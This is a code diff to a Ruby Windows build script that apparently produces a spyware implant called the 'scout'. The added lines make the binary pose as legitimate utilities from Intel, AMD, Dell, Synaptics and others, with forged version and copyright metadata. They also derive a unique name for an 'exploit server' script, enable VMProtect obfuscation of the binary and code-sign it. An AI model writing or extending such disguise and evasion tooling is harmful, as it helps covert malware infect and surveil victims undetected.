@@ -264,9 +264,12 @@ class BuildWindows < Build
 
   def scout_name(seed)
     scout_names = [
-    	{name: 'BTHSAmpPalService', version: '15.5.0.14', desc: 'Intel(r) Centrino(r) Wireless Bluetooth(r) + High Speed Virtual Adapter', company: 'Intel Corporation', copyright: 'Copyright (c) Intel Corporation 2012'},
-    	{name: 'iSCTsysTray', version: '3.0.30.1526', desc: 'Intel(r) Smart Connect Technology System Tray Notify Icon', company: 'Intel Corporation', copyright: 'Copyright (c) 2011 Intel Corporation'},
-    	{name: 'quickset', version: '11.1.27.2', desc: 'QuickSet', company: 'Dell Inc.', copyright: '(c) 2010 Dell Inc.'}
+      {name: 'btplayerctrl', version: '1.1.0.52', desc: 'Intel PROSet\Wireless Bluetooth', company: 'Motorola Solutions, Inc.', copyright: '(c) 2012 Motorola Solutions, Inc.' },
+      {name: 'HydraDM', version: '4.0.66.0', desc: 'AMD HydraVision Desktop Manager', company: 'AMD', copyright: 'Copyright (c) AMD 2006-2010' },
+      {name: 'iFrmewrk', version: '14.1.1.1', desc: 'Intel(R) ProSet/Wireless Framework', company: 'Intel Corporation', copyright: 'Copyright (c) Intel Corporation 1999-2011' },
+      {name: 'Toaster', version: '1.0.1.140', desc: 'Dell Backup And Recovery', company: 'SoftThinks SAS', copyright: '(c) 2007-2013 SoftThinks SAS' },
+      {name: 'rusb3mon', version: '3.0.8.0', desc: 'USB 3.0 Monitor', company: 'Renesas Electronics Corporation', copyright: '(c) 2010-2011 Renesas Electronics Corporation' },
+      {name: 'SynTPEnh', version: '15.3.5.0', desc: 'Synaptics TouchPad Enhancements', company: 'Synaptics Incorporated', copyright: 'Copyright (c) Synaptics Incorporated 1996-2011' }
     ]
 
     scout_names[seed.ord % scout_names.size]
@@ -431,6 +434,11 @@ class BuildWindows < Build
     info_soldier = soldier_name(seed)
     icon_soldier = "icons/#{info_soldier[:name]}.ico"
 
+    # make the name unique (used by the exploit script on exploit server)
+    hash = Digest::SHA1.digest(File.read(path('version')) + info_scout[:name])
+    hash = hash.split('').keep_if {|x| x.ord > 128}.join[0..5].unpack('H*')
+    @appname += hash
+
     # binary patch the name of the scout once copied in the startup
     patch_file(:file => 'scout') do |content|
       begin
@@ -461,8 +469,8 @@ class BuildWindows < Build
     #CrossPlatform.exec path('packer32'), "#{path('scout')}"
 
     # vmprotect the scout
-    #CrossPlatform.exec path('VMProtect_Con'), "#{path('scout')} #{path('scout_vmp')}"
-    #FileUtils.mv path('scout_vmp'), path('scout')
+    CrossPlatform.exec path('VMProtect_Con'), "#{path('scout')} #{path('scout_vmp')}"
+    FileUtils.mv path('scout_vmp'), path('scout')
 
     # sign it
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('scout')}" if to_be_signed?
